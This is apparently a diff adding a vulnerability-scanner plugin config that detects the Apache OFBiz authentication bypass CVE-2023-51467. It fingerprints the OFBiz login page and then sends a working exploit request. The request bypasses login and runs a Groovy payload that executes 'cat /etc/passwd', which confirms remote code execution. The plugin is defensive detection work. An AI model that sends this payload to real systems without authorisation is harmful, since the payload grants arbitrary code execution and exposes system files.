@@ -1,0 +1,86 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Ofbiz_CVE_2023_51467"
+  author: "W0ngL1"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2023-51467"
+  }
+  severity: CRITICAL
+  title: "Apache Ofbiz Authentication Bypass Leads to RCE (CVE-2023-51467)"
+  description: "The vulnerability permits attackers to circumvent authentication processes, enabling them to remotely execute arbitrary code."
+  recommendation: "Update the version to 22.01.01/18.12.10 or later."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2023-51467"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprinting_for_ofbiz"
+  http_request: {
+    method: GET
+    uri: "/accounting/control/main"
+    headers: [
+      { name: "Host" value: "localhost" }
+    ]
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "OFBiz" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "trigger_rce"
+  http_request: {
+    method: POST
+    uri: "/webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y"
+    headers: [
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" },
+      { name: "Host" value: "localhost" }
+    ]
+    data: "groovyProgram=throw+new+Exception('cat /etc/passwd'.execute().text);"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "root:"},
+          { body: {} contains: ":0:0:"}
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "fingerprinting_for_ofbiz",
+    "trigger_rce"
+  ]
+}
